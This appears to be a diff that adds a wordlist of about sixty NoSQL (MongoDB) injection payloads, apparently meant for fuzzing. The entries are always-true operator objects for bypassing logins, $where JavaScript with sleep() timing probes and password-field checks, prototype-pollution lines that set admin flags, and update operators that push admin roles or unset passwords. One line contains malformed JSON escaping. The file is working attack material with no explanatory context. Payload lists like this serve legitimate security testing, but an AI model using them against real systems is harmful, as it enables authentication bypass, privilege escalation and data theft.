@@ -1,0 +1,60 @@
+{"$ne": null}
+{"$ne": ""}
+{"$ne": 0}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": "z"}
+{"$lte": "z"}
+{"$in": [null]}
+{"$nin": [1,2,3]}
+{"$exists": true}
+{"$exists": false}
+{"$regex": ".*"}
+{"$regex": "^.*$"}
+{"$regex": ".*", "$options": "i"}
+{"$where": "true"}
+{"$where": "1==1"}
+{"$where": "this.password && this.password.length > 0"}
+{"$where": "sleep(2000)"}
+{"$where": "sleep(3000)"}
+{"$where": "return true"}
+{"$or": [{"_id": null}, {"_id": {"$gt": ""}}]}
+{"$or": [{"username": {"$ne": "x"}}, {"password": {"$ne": "y"}}]}
+{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}
+{"$comment": "stealthix"}
+{"$expr": {"$eq": [1, 1]}}
+{"$expr": {"$gt": [2, 1]}}
+{"$expr": {"$eq": ["$role", "admin"]}}
+{"$regex": {"$ne": ""}}
+{"$where": "function() { return true; }"}
+{"$accumulator": {"init": "function() {return 1;}", "accumulate": "function(state) {return state+1;}", "accumulateArgs": [], "merge": "function(s1, s2) {return s1+s2;}", "finalize": "function(state) {return state;}", "lang": "js"}}
+{"$where": "Object.keys(this).length > 0"}
+{"$function": {"body": "function(){return true;}", "args": [], "lang": "js"}}
+{"$set": {"profile": {"$mergeObjects": [{"admin": true}, "$profile"]}}}
+{"$unset": "password"}
+{"$push": {"roles": "admin"}}
+{"$pull": {"roles": "user"}}
+{"$inc": {"loginAttempts": -1}}
+{"$rename": {"user": "admin"}}
+{"$addToSet": {"roles": "admin"}}
+{"$where": "this.constructor && this.constructor.name"}
+{"$where": "this['__proto__'] && this['__proto__'].admin=true"}
+{"$where": "sleep(5000)"}
+{"$where": "return this.role=='admin'"}
+{"$or": [{"role": "admin"}, {"role": {"$ne": null}}]}
+{"$ne": [""]}
+{"$gt": null}
+{"$regex": "^[a-z].*"}
+{"$regex": ".*(admin|root).*"}
+{"$text": {"$search": "\" or \"1\"=\"1"}}
+{"$where": "function(){return this.password && this.password.length>0;}"}
+{"$where": "sleep(8000)"}
+{"$expr": {"$eq": ["$username", "$username"]}}
+{"$expr": {"$ne": [1, 2]}}
+{"$function": {"body": "function(){return true;}", "args": [], "lang": "js"}}
+{"$where": "this && this.username && this.username.match(/.*/)"}
+{"$where": "function(){return !!this && !!this.username;}"}
+{"$where": "this.password && this.password.match(/.*/)"}
+{"$or": [{"admin": true}, {"admin": {"$exists": true}}]}
+{"$regex": {"$gt": ""}}
+{"$expr": {"$gt": [{"$strLenCP": \"$password\"}, 0]}}
